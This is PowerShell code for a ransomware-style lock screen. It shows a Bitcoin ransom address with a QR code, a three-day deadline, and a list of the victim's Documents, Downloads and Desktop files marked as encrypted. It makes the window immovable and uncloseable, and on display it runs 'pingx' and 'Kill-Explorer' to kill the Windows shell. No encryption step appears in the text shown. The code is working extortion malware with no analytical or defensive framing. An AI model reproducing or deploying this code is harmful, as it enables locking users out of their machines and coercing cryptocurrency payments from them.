    $stream = New-Object System.IO.MemoryStream($qrBytes, $false)
    $bitmap = New-Object System.Windows.Media.Imaging.BitmapImage
    $bitmap.BeginInit()
    $bitmap.StreamSource = $stream
    $bitmap.CacheOption = [System.Windows.Media.Imaging.BitmapCacheOption]::OnLoad
    $bitmap.EndInit()
    
    $qrImage = New-Object System.Windows.Controls.Image
    $qrImage.Source = $bitmap
    $qrImage.Stretch = [System.Windows.Media.Stretch]::Uniform
    $qrGrid.Children.Add($qrImage)
} catch {
    $qrFallback = New-Object System.Windows.Controls.TextBlock
    $qrFallback.Text = "[QR CODE IMAGE]"
    $qrFallback.Foreground = [System.Windows.Media.Brushes]::Black
    $qrFallback.FontSize = 16
    $qrFallback.HorizontalAlignment = 'Center'
    $qrFallback.VerticalAlignment = 'Center'
    $qrGrid.Children.Add($qrFallback)
}

$qrSection.Child = $qrGrid

$qrLabel = New-Object System.Windows.Controls.TextBlock
$qrLabel.Text = "Scan QR code or enter address manually"
$qrLabel.Foreground = [System.Windows.Media.Brushes]::LightGray
$qrLabel.FontSize = 12
$qrLabel.HorizontalAlignment = 'Center'
$qrLabel.Margin = '0,0,0,10'
$qrLabel.FontStyle = 'Italic'

$addressPanel = New-Object System.Windows.Controls.Border
$addressPanel.Background = [System.Windows.Media.Brushes]::Black
$addressPanel.BorderBrush = [System.Windows.Media.Brushes]::DarkGoldenrod
$addressPanel.BorderThickness = '1,1,1,1'
$addressPanel.Padding = '10,10,10,10'
$addressPanel.Margin = '0,0,0,10'

$addressStack = New-Object System.Windows.Controls.StackPanel

$addressTitle = New-Object System.Windows.Controls.TextBlock
$addressTitle.Text = "BITCOIN ADDRESS:"
$addressTitle.Foreground = [System.Windows.Media.Brushes]::LightGreen
$addressTitle.FontFamily = 'Consolas'
$addressTitle.FontSize = 12
$addressTitle.FontWeight = 'Bold'
$addressTitle.Margin = '0,0,0,5'

$addressValue = New-Object System.Windows.Controls.TextBlock
$addressValue.Text = "bc1q3z7uwz8p5lpwk0wnz5aj2xyszs9fty5s97xm7u"
$addressValue.Foreground = [System.Windows.Media.Brushes]::White
$addressValue.Background = [System.Windows.Media.Brushes]::DarkSlateGray
$addressValue.FontFamily = 'Cascadia Code'
$addressValue.FontSize = 14
$addressValue.Padding = '5,3,5,3'
$addressValue.TextAlignment = 'Center'
$addressValue.FontWeight = 'Bold'

$addressStack.Children.Add($addressTitle)
$addressStack.Children.Add($addressValue)
$addressPanel.Child = $addressStack

$timeWarning = New-Object System.Windows.Controls.TextBlock
$timeWarning.Text = "⏰ YOU HAVE 3 DAYS"
$timeWarning.Foreground = [System.Windows.Media.Brushes]::Red
$timeWarning.FontSize = 14
$timeWarning.FontWeight = 'Bold'
$timeWarning.HorizontalAlignment = 'Center'
$timeWarning.Margin = '0,10,0,0'

$paymentStack.Children.Add($paymentTitle)
$paymentStack.Children.Add($amountDisplay)
$paymentStack.Children.Add($qrSection)
$paymentStack.Children.Add($qrLabel)
$paymentStack.Children.Add($addressPanel)
$paymentStack.Children.Add($timeWarning)
$paymentPanel.Child = $paymentStack

$leftContainer.Children.Add($section1)
$leftContainer.Children.Add($section2)
$leftContainer.Children.Add($paymentPanel)

$leftScroll.Content = $leftContainer

$fileContainer = New-Object System.Windows.Controls.Border
$fileContainer.Background = [System.Windows.Media.Brushes]::Black
$fileContainer.BorderBrush = [System.Windows.Media.Brushes]::Gray
$fileContainer.BorderThickness = '1,1,1,1'
$fileContainer.Margin = '0,70,10,20'
[System.Windows.Controls.Grid]::SetColumn($fileContainer, 1)

$fileStack = New-Object System.Windows.Controls.StackPanel
$fileStack.Margin = '5,5,5,5'

$fileTitle = New-Object System.Windows.Controls.TextBlock
$fileTitle.Text = "TOP $($systemFiles.Count) ENCRYPTED FILES"
$fileTitle.Foreground = [System.Windows.Media.Brushes]::Red
$fileTitle.FontFamily = 'Segoe UI'
$fileTitle.FontSize = 18
$fileTitle.FontWeight = [System.Windows.FontWeights]::Bold
$fileTitle.Margin = '0,0,0,10'
$fileTitle.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
$fileStack.Children.Add($fileTitle)

$folderIndicators = New-Object System.Windows.Controls.StackPanel
$folderIndicators.Orientation = 'Horizontal'
$folderIndicators.HorizontalAlignment = 'Center'
$folderIndicators.Margin = '0,0,0,10'

$docIndicator = New-Object System.Windows.Controls.Label
$docIndicator.Content = "📁 Documents"
$docIndicator.Foreground = [System.Windows.Media.Brushes]::LightBlue
$docIndicator.FontSize = 11
$docIndicator.Margin = '5,0,5,0'
$folderIndicators.Children.Add($docIndicator)

$dlIndicator = New-Object System.Windows.Controls.Label
$dlIndicator.Content = "📥 Downloads"
$dlIndicator.Foreground = [System.Windows.Media.Brushes]::LightGreen
$dlIndicator.FontSize = 11
$dlIndicator.Margin = '5,0,5,0'
$folderIndicators.Children.Add($dlIndicator)

$deskIndicator = New-Object System.Windows.Controls.Label
$deskIndicator.Content = "🖥️ Desktop"
$deskIndicator.Foreground = [System.Windows.Media.Brushes]::LightGoldenrodYellow
$deskIndicator.FontSize = 11
$deskIndicator.Margin = '5,0,5,0'
$folderIndicators.Children.Add($deskIndicator)

$fileStack.Children.Add($folderIndicators)

$scrollViewer = New-Object System.Windows.Controls.ScrollViewer
$scrollViewer.VerticalScrollBarVisibility = 'Auto'
$scrollViewer.Height = 650

$fileListPanel = New-Object System.Windows.Controls.StackPanel

$currentFolder = ""
foreach ($file in $systemFiles) {
    if ($currentFolder -ne $file.Folder) {
        $currentFolder = $file.Folder
        
        $folderHeader = New-Object System.Windows.Controls.TextBlock
        $folderHeader.Text = "=== $currentFolder ==="
        $folderHeader.Foreground = if ($currentFolder -eq "Documents") { [System.Windows.Media.Brushes]::LightBlue }
                                   elseif ($currentFolder -eq "Downloads") { [System.Windows.Media.Brushes]::LightGreen }
                                   else { [System.Windows.Media.Brushes]::LightGoldenrodYellow }
        $folderHeader.FontWeight = [System.Windows.FontWeights]::Bold
        $folderHeader.FontSize = 12
        $folderHeader.Margin = '0,10,0,5'
        $fileListPanel.Children.Add($folderHeader)
    }
    
    $fileEntry = New-Object System.Windows.Controls.StackPanel
    $fileEntry.Orientation = 'Horizontal'
    $fileEntry.Margin = '5,2,5,2'
    
    $icon = switch ($file.Extension.ToLower()) {
        {$_ -in '.pdf'} { '📄' }
        {$_ -in '.doc', '.docx', '.txt', '.rtf'} { '📝' }
        {$_ -in '.xls', '.xlsx', '.csv'} { '📊' }
        {$_ -in '.ppt', '.pptx'} { '📽️' }
        {$_ -in '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp'} { '🖼️' }
        {$_ -in '.mp4', '.mov', '.mkv'} { '🎬' }
        {$_ -in '.heic', '.heif', '.cr3', '.dng', '.psd'} { '📷' }
        {$_ -in '.zip', '.7zip'} { '📦' }
        default { '📁' }
    }
    
    $iconText = New-Object System.Windows.Controls.TextBlock
    $iconText.Text = $icon
    $iconText.FontSize = 12
    $iconText.Margin = '0,0,5,0'
    $fileEntry.Children.Add($iconText)
    
    $fileName = New-Object System.Windows.Controls.TextBlock
    $fileName.Text = $file.Name
    $fileName.Foreground = [System.Windows.Media.Brushes]::White
    $fileName.FontSize = 11
    $fileName.FontFamily = 'Consolas'
    $fileName.TextTrimming = 'CharacterEllipsis'
    $fileName.Width = 300
    $fileEntry.Children.Add($fileName)
    
    $statusIcon = New-Object System.Windows.Controls.TextBlock
    $statusIcon.Text = " 🔒"
    $statusIcon.Foreground = [System.Windows.Media.Brushes]::Red
    $statusIcon.FontSize = 10
    $fileEntry.Children.Add($statusIcon)
    
    $fileListPanel.Children.Add($fileEntry)
}

$scrollViewer.Content = $fileListPanel
$fileStack.Children.Add($scrollViewer)

$fileSummary = New-Object System.Windows.Controls.TextBlock
$fileSummary.Text = "Showing first $($systemFiles.Count) of 104,366 total encrypted"
$fileSummary.Foreground = [System.Windows.Media.Brushes]::Red
$fileSummary.FontSize = 12
$fileSummary.FontWeight = [System.Windows.FontWeights]::Bold
$fileSummary.Margin = '0,10,0,0'
$fileSummary.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
$fileStack.Children.Add($fileSummary)

$fileContainer.Child = $fileStack

$null = $g.Children.Add($leftScroll)
$null = $g.Children.Add($fileContainer)
$null = $g.Children.Add($b)
$null = $g.Children.Add($title)

$lockReady = $false
$lockLeft  = 0.0
$lockTop   = 0.0

$w.Add_ContentRendered({
    $script:lockLeft  = $w.Left
    $script:lockTop   = $w.Top
    $script:lockReady = $true
    pingx
    Kill-Explorer
})

$w.Add_LocationChanged({
    if ($script:lockReady) {
        if ($w.Left -ne $script:lockLeft -or $w.Top -ne $script:lockTop) {
            $w.Left = $script:lockLeft
            $w.Top  = $script:lockTop
        }
    }
})

$w.Content = $g

$w.Add_Closing({ param($s,$e) $e.Cancel = $true })

$null = $w.ShowDialog()
